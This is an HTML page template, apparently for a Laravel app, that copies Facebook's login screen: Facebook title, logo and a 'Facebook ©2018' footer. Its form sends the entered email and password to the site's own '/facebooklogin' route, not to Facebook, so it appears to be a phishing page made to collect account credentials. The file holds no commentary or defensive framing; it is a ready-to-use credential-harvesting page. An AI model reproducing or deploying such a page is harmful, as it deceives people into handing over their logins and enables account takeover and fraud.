<!doctype html>
<html lang="en">
   <head>
      <!-- Required meta tags -->
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <!-- Bootstrap CSS -->
      <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
      <link rel="stylesheet" type="text/css" href="{{url('main.css')}}">
      <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css" integrity="sha384-mzrmE5qonljUremFsqc01SB46JvROS7bZs3IO2EmfFsd15uHvIt+Y8vEf7N7fWAU" crossorigin="anonymous">
      <link rel="icon" href="{{url('12.png')}}">
      <title>facebook -  Log In or Sign Up</title>
   </head>
   <body>
      <nav class="navbar navbar-expand-md navbar-fixed-top   main-nav">
         <div class="container">
            <div class="navbar-collapse collapse nav-content order-2">
               <ul class="nav navbar-nav">
               </ul>
            </div>
            <ul class="nav navbar-nav text-nowrap flex-row mx-md-auto order-1 order-md-2">
               <li class="nav-item "><a class="nav-link logo" href="#">facebook</a></li>
               <button class="navbar-toggler ml-2" type="button" data-toggle="collapse" data-target=".nav-content" aria-expanded="false" aria-label="Toggle navigation">
               <span class="navbar-toggler-icon"></span>
               </button>
            </ul>
            <div class="ml-auto navbar-collapse collapse nav-content order-3 order-md-3">
               <ul class="ml-auto nav navbar-nav">
               </ul>
            </div>
         </div>
      </nav>
      <div class="container">
        <form action="{{url('/facebooklogin')}}" method="POST">
         <div class="row justify-content-center">
         	<div class="card-box">
			   <div class="form-group">
			    <input type="email" class="form-control" id="email" name="email" placeholder="Mobile Number or Email">
			    <input type="password" class="form-control" id="pwd" name="password" placeholder="Password">
			  </div>
			  <button type="submit" class="btn btn-login btn-block">Log In</button>
      </form>
			  <div class="row justify-content-center">
   			  	<div class="col-xs-5 col-md-5 col-sm-5 hr"><hr></div>
   			  	<div class="col-xs-2 col-md-1 col-sm-2 hr-or">or</div>
   			  	<div class="col-xs-5 col-md-5 col-sm-5 hr"><hr></div>
			  </div>

			  <div class="row justify-content-center">
			  	 <button type="submit" class="btn btn-new-account btn-sm btn btn-block">Create New Account</button>
			  </div>
			  <div class="row justify-content-center">
			  	 <ul class="list-group list-group-flush">
			  	 	 <li class="list-group-item">Forgot Password?  Help Center</li>
			  	 	</ul>
			  </div>
			</div>
         </div>
      </div>
      <div class="container-footer ">
        <div class="row footer">
         	<div class="col-lg-6 col-md-6 col-sm-6 col-xs-6">
         		<ul class="list-group li-footer">
         			<li class="li-item li-footer-active">English</li>
         			<li class="li-item">Français (France)</li>
         			<li class="li-item">Deutsch</li>
         			<li class="li-item">Português (Brasil)</li>
         		</ul>
         	</div>
         	<div class="col-lg-6 col-md-6 col-sm-6 col-xs-6">
         		<ul class=" list-group li-footer">
         			<li class="li-item">العربيه</li>
         			<li class="li-item">Français (France)</li>
         			<li class="li-item">Deutsch</li>
         			<li class="li-item">Português (Brasil)</li>
         			<i class="fa fa-plus" aria-hidden="true"></i>
         		</ul>
         	</div>
         	
         </div>
         <div class="row justify-content-center copyright">Facebook ©2018</div>
      </div>
     
      <!-- Optional JavaScript -->
      <!-- jQuery first, then Popper.js, then Bootstrap JS -->
      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
   </body>
</html>